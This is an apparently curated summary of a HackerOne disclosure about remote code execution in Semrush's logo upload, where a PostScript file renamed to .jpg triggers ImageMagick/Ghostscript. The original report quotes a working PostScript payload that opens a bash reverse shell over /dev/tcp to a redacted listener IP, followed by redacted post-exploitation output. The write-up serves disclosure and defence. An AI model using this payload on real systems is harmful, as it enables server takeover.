# Remote Code Execution via ImageMagick PostScript Processing in Logo Upload

## Metadata
- **Source:** HackerOne
- **Report:** 403417 | https://hackerone.com/reports/403417
- **Submitted:** 2018-08-31
- **Reporter:** fransrosen
- **Program:** Semrush
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Remote Code Execution, Arbitrary File Upload, Insecure Deserialization, Command Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
The logo upload functionality in Semrush's report constructor (www.semrush.com/my_reports/constructor) processes uploaded images through a vulnerable version of ImageMagick with unrestricted file type policies. An attacker can upload a PostScript file disguised as JPG to trigger Ghostscript execution, leading to arbitrary command execution on the server with application privileges.

## Attack scenario
1. Attacker crafts a malicious PostScript payload that invokes Ghostscript with arbitrary bash commands
2. Payload is saved with a .jpg extension to bypass basic file type validation
3. Attacker uploads the file through the logo upload functionality in the report constructor
4. ImageMagick processes the file and passes it to Ghostscript due to unrestricted policy.xml configuration
5. PostScript %pipe% directive executes the embedded bash command (reverse shell in this case)
6. Attacker gains remote code execution with application privileges on the Semrush server

## Root cause
ImageMagick's policy.xml configuration file does not restrict execution of dangerous formats (EPS, PS, PDF, XPS) that can delegate to Ghostscript. Combined with insufficient file type validation (relying on extension rather than content inspection), malicious PostScript code executes during image processing.

## Attacker mindset
Exploit known ImageMagick/Ghostscript vulnerability chain (documented by Tavis Ormandy) by bypassing simple extension-based file validation. Recognition that many organizations have unpatched or misconfigured ImageMagick instances makes this a high-confidence exploitation path.

## Defensive takeaways
- Implement strict policy.xml for ImageMagick restricting processing to safe formats only (GIF, JPG, PNG)
- Disable or remove EPS, PS, PDF, and XPS delegates from ImageMagick configuration
- Validate file content via magic bytes/headers, not just file extensions
- Process file uploads in sandboxed/isolated environments with minimal privileges
- Keep ImageMagick and Ghostscript updated to latest patched versions
- Implement allowlist-based file type validation before passing to image processing libraries
- Run image processing operations with minimal system privileges and in containers
- Monitor and log image processing operations for anomalous activity

## Variant hunting
Search for other file upload functionality accepting 'images' (avatars, banners, documents, thumbnails). Check for other ImageMagick/Ghostscript processing pipelines. Look for similar patterns in: user profile images, document conversion services, thumbnail generation, batch image processing APIs.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1200: Traffic Signaling
- T1204: User Execution
- T1566: Phishing
- T1059: Command and Scripting Interpreter

## Notes
This is a real-world exploitation of documented ImageMagick CVE-2016-3714 and related variants (ImageTragick). The researcher properly verified RCE by checking /etc/hosts and accessing files via the web application, confirming the Semrush infrastructure. The payload uses %pipe% directive which is specific to Ghostscript's PostScript interpreter. This vulnerability class requires both vulnerable ImageMagick AND Ghostscript delegation to be exploitable. The researcher responsibly redacted sensitive information in their proof.

## Full report
<details><summary>Expand</summary>

The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor

{F340480}

is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2

The following PoC-payload was used to get a reverse shell when issuing the upload:

Save it as `test.jpg` and upload it as an image for the logo:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

(`█████` is the IP of my listener)

This resulted in:

```
█████████
██████████
ls
███████
██████████
app
████████
██████████
████
████████
██████
███
█████████
████████
██████
█████████
█████████
█████
██████████
█████
██████
█████████
███
█████
██████
████
█████
█████████
███████
████████
███
███


███
whoami
████
███████
██████
```

At this point I wasn't sure if this was a third party or not, so I checked two things:

## `██████` to list files in the ██████ dir. It showed me:

```
█████████
███
████████
████████
███████
█████
████
█████████
████
██████████
```

I navigated to 

```
https://www.semrush.com/my_reports/████
https://www.semrush.com/my_reports/████████
```

And confirmed those two files exists in this directory.

## `/etc/hosts`

This one confirmed it by:

```
cat /etc/hosts
127.0.0.1 localhost
█████ ████.semrush.net ███
████████ ███████
```

I'm certain this is a SEMrush-instance.

{F340481}

You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.

Regards,
Frans

## Impact

#

</details>

---
*Analysed by Claude on 2026-05-11*
